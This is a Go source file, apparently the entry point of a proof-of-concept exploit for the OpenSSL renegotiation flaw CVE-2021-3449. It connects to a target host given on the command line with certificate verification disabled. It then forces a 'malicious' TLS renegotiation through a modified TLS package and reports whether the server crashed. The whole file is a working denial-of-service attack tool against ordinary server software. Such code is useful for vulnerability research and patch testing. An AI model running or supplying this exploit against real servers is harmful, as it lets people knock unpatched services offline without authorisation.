package main

import (
	"flag"
	"os"

	"cve_2021_3449/tls"
)

func main() {
	host := flag.String("host", "", "host:port to connect to")
	servername := flag.String("sni", "", "servername")
	flag.Parse()
	// Connect to the target, forcing TLSv1.2
	conn, err := tls.Dial("tcp", *host, &tls.Config{
		InsecureSkipVerify: true,
		Renegotiation:      tls.RenegotiateFreelyAsClient,
		ServerName:         *servername,
	})
	if err != nil {
		println("failed to connect: " + err.Error())
		os.Exit(1)
	}
	defer conn.Close()
	println("connected")
	// Force a TLS renegotiation per RFC 5746.
	if err := conn.Handshake(); err != nil && err.Error() == "tls: handshake failure" {
		println("server is not vulnerable, exploit failed")
	} else if err != nil {
		println("malicious handshake failed, exploit might have worked: " + err.Error())
	} else {
		println("malicious renegotiation successful, exploit failed")
	}
}
